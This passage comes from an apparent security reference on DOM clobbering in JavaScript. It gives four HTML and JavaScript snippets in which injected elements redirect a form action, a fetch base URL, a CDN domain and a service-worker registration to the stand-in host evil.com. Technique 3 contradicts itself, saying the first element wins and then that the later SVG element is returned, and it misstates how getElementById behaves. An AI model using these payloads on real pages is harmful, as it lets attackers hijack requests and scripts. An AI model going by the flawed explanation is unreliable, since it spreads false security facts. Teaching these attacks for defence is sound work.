---
source: "languages/javascript/dom-clobbering.md"
title: "DOM Clobbering Attacks in Modern Frameworks"
category: "language-vuln"
language: "javascript"
chunk: 6
total_chunks: 9
heading: "DOM Clobbering Techniques"
---

## DOM Clobbering Techniques

### Technique 1: Form Element Clobbering

```html
<!-- The FORM element's named access creates clobbering -->
<form id="loginForm">
  <input name="action" value="http://evil.com/steal">
</form>

<script>
  // This references the clobbered input, not the intended action
  document.loginForm.action.value; // "http://evil.com/steal"
</script>
```

### Technique 2: Anchor href Clobbering

```html
<!-- Anchor elements expose their href property on window -->
<a id="apiBase" href="http://evil.com/">

<script>
  if (window.apiBase) {
    // window.apiBase.href is "http://evil.com/" — not the intended API URL
    fetch(window.apiBase + "/users") // -> http://evil.com/users
  }
</script>
```

### Technique 3: HTML + SVG Clobbering

```html
<!-- Multiple elements with same id: first in DOM wins -->
<div id="cdnDomain">legit.com</div>
<svg>
  <foreignobject>
    <html id="cdnDomain">evil.com</html>
  </foreignobject>
</svg>

<script>
  // document.getElementById('cdnDomain') returns the SVG <html> element
  // because it appears later and overrides the retrieval
  console.log(document.getElementById('cdnDomain').innerText); // "evil.com"
</script>
```

### Technique 4: Service Worker Clobbering

```javascript
// Combining DOM Clobbering with Service Worker registration
// See service-worker-attacks.md for full details

// If the page passes config via innerText of hidden divs:
// <div id="cdnDomain" style="display:none">legit.com</div>
// Attacker injects:
// <html id="cdnDomain">evil.com</html>

// Service worker registers with attacker-controlled domain
navigator.serviceWorker.register(
  `/sw.js?cdnDomain=${document.getElementById('cdnDomain').innerText}`
);
```

---